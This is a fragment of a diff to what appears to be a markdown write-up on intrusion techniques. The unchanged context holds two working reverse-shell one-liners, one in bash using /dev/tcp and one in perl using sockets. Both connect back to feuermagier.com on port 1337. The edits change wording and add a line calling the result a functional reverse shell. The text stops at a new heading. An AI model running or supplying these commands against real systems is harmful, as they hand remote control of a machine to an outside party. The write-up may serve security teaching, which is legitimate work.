@@ -43,9 +43,13 @@ My personal favorite being a simple:
 ```bash
 sh -i >& /dev/tcp/feuermagier.com/1337 0>&1
 ```
-Or alternatively with perl:
+or alternatively with perl:
 ```perl
 perl -e 'use Socket;$i="feuermagier.com";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 in case the first one is making problems.
-You'll be surprised by how many systems and minimalist dev-containers ship with perl installed.
+You'll be surprised by how many systems and even minimalist dev-containers ship with perl installed.
+
+In any case, this leaves us with a simple, but functional reverse shell.
+
+### 2. 
